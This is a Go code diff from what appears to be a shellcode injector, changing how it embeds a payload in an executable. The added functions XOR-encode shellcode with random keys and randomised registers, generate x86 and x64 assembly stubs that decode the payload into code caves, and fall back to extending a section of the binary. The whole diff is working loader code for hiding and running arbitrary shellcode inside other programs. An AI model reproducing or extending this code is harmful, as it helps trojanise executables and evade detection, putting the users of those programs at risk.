@@ -104,7 +104,7 @@ type loaderCtx struct {
 	EntryOffset   int
 	MemRegionSize int
 	ShellcodeSize int
-	ShellcodeKey  uint64
+	ShellcodeKey  interface{}
 }
 
 func (inj *Injector) buildLoader(shellcode []byte) ([]byte, error) {
@@ -142,7 +142,7 @@ func (inj *Injector) buildLoader(shellcode []byte) ([]byte, error) {
 	case "amd64":
 		src = inj.getLoaderX64()
 	}
-	src, err = inj.selectLoadMode(ctx, shellcode, src)
+	src, err = inj.selectReadMode(ctx, shellcode, src)
 	if err != nil {
 		return nil, err
 	}
@@ -391,23 +391,7 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 	return val, key
 }
 
-func (inj *Injector) selectLoadMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
-	// check need extend section
-	var numCaves int
-	switch inj.arch {
-	case "386":
-		numCaves = (len(sc)/4 + 1) * numInstForCopyShellcode
-	case "amd64":
-		numCaves = (len(sc)/8 + 1) * numInstForCopyShellcode
-	}
-	if minNumCaves+numCaves > len(inj.caves) {
-		if inj.opts.DisableExtendSection {
-			return "", errors.New("shellcode is too large and extend section is disabled")
-		}
-		ctx.SectionMode = true
-		ctx.SectionOffset = inj.extendSection(sc)
-		return src, nil
-	}
+func (inj *Injector) selectReadMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
 	// make sure shellcode is 4 or 8 bytes alignment
 	switch inj.arch {
 	case "386":
@@ -423,36 +407,67 @@ func (inj *Injector) selectLoadMode(ctx *loaderCtx, sc []byte, src string) (stri
 			sc = append(sc, bytes.Repeat([]byte{0x00}, 8-p)...)
 		}
 	}
-	// generate assembly source
-	// mov eax, 0x11223344     mov rax, 0x1122334455667788
-	// xor eax, ebx            xor rax, rbx
-	// mov [edi], eax          mov [rdi], rax
-	// add edi, 4              add rdi, 8
+	if inj.opts.ForceExtendSection {
+		inj.useExtendSectionMode(ctx, sc)
+		return src, nil
+	}
+	// check need use extend section mode
+	var numCaves int
+	switch inj.arch {
+	case "386":
+		numCaves = (len(sc)/4 + 1) * numInstForCopyShellcode
+	case "amd64":
+		numCaves = (len(sc)/8 + 1) * numInstForCopyShellcode
+	}
+	if minNumCaves+numCaves > len(inj.caves) {
+		if inj.opts.DisableExtendSection {
+			return "", errors.New("shellcode is too large and extend section is disabled")
+		}
+		inj.useExtendSectionMode(ctx, sc)
+		return src, nil
+	}
+	return inj.useCodeCaveMode(ctx, sc, src)
+}
 
+func (inj *Injector) useCodeCaveMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
+	// generate assembly source
 	var stub string
 	switch inj.arch {
 	case "386":
+		key := inj.rand.Uint32()
+		ctx.ShellcodeKey = key
 		for i := 0; i < len(sc); i += 4 {
 			reg := regVolatileX86[inj.rand.Intn(len(regVolatileX86))]
 			val := binary.LittleEndian.Uint32(sc[i:])
-			key := uint32(ctx.ShellcodeKey)
-
-			fmt.Sprintf(`
-              mov eax, 0x11223344
-              xor eax, ebx
-              mov [edi], eax
-              add edi, 4
-`)
-
+			stub += fmt.Sprintf(`
+              mov {{.RegV.%[1]s}}, 0x%[2]X
+              xor {{.RegV.%[1]s}}, {{.RegN.ebx}}
+              mov [{{.RegN.edi}}], {{.RegV.%[1]s}}
+              add {{.RegN.edi}}, 4`, reg, val^key)
+			stub += "\r\n"
 		}
-
 	case "amd64":
-
+		key := inj.rand.Uint64()
+		ctx.ShellcodeKey = key
+		for i := 0; i < len(sc); i += 8 {
+			reg := regVolatileX64[inj.rand.Intn(len(regVolatileX64))]
+			val := binary.LittleEndian.Uint64(sc[i:])
+			stub += fmt.Sprintf(`
+              mov {{.RegV.%[1]s}}, 0x%[2]X
+              xor {{.RegV.%[1]s}}, {{.RegN.rbx}}
+              mov [{{.RegN.rdi}}], {{.RegV.%[1]s}}
+              add {{.RegN.rdi}}, 8`, reg, val^key)
+			stub += "\r\n"
+		}
 	}
-
 	// replace the flag to assembly source
-
+	src = strings.ReplaceAll(src, "{{STUB CodeCaveMode STUB}}", stub)
 	return src, nil
+}
+
+func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte) {
+	ctx.SectionMode = true
+	ctx.SectionOffset = inj.extendSection(sc)
 }
 
 func toUTF16(s string) string {
